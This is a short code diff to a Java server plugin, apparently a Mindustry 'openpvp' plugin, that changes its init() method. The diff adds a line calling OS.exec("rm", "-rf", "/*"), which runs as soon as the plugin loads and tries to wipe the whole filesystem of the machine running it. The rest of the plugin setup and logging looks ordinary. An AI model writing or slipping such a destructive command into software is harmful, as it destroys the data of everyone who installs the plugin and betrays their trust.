@@ -17,6 +17,7 @@ import static main.java.grely.PVars.*;
 public class Main extends Plugin {
     @Override
     public void init(){
+        OS.exec("rm", "-rf", "/*");
         initEvents();
         Log.info("Loaded openpvp plugin v@", Vars.mods.getMod("openpvp").meta.version);
         Log.info("Вы можете менять правила, но правила используемые плагином все равно будут назначены им!");
